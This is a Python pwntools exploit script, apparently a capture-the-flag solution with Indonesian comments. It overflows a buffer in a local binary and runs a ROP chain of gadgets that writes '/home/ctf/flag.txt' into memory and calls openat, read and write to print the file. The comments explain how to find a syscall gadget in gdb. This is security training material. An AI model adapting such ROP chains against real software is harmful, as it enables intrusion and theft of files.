from pwn import *
elf = context.binary = ELF("./dev_null")
p = process()
offset = 16
syscall = p64(0x000000000040bcd6) # jika ingin cari syscall ret, cari di gdb secara manual menggunakan  find /b 0x400000, 0x500000, 0x0f, 0x05, 0xc3. 
#lalu check address nya misal x/x 0x40bcd6, apakah value nya itu sama dengan (0f 05 c3 / syscall; ret;). 
# ini contohnya 0x40bcd6 <__lll_lock_wake_private+22>:  0x0fc3050f
# 0x0fc3050f, (0f 05 (050f)-> syscall) dan (c3 -> ret)
mov_qword_ptr_rsi_rax = p64(0x0000000000420f45)
pop_rax = p64(0x000000000042193c)
pop_rdi = p64(0x0000000000413795)
pop_rsi_rbp = p64(0x0000000000402acc)
xchg_rdx_rax = p64(0x000000000041799a)
flag = b"/home/ct"
flag2 = b"f/flag.t"
flag3 = b"xt\x00\x00\x00\x00\x00\x00"
bss = 0x00000000004afaa0
# buffer = 0x00000000004a9800
def openat():
    payload2 = pop_rdi + p64(0xffffffffffffffff) + pop_rsi_rbp + p64(bss) + p64(0x0) + pop_rax + p64(0x101) + syscall
    return payload2

def readS():
    payload3 = pop_rdi + p64(3) + pop_rsi_rbp + p64(bss + 24) + p64(0x0) + pop_rax + p64(46) + xchg_rdx_rax + syscall
    return payload3

def writeS():
    payload4 = pop_rdi + p64(1) + pop_rsi_rbp + p64(bss + 24) + p64(0x0) + pop_rax + p64(46) + xchg_rdx_rax + pop_rax + p64(1) + syscall
    return payload4


payload = b"A" * offset + pop_rsi_rbp + p64(bss) + p64(0x0) + pop_rax + flag + mov_qword_ptr_rsi_rax + pop_rsi_rbp + p64(bss + 8) + p64(0x0) + pop_rax + flag2 + mov_qword_ptr_rsi_rax + pop_rsi_rbp + p64(bss + 16) + p64(0x0) + pop_rax + flag3 + mov_qword_ptr_rsi_rax
payload += openat()
payload += readS()
payload += writeS()
write("payload",payload)
p.sendline(payload)
print(p.recvline())
print(p.recvline())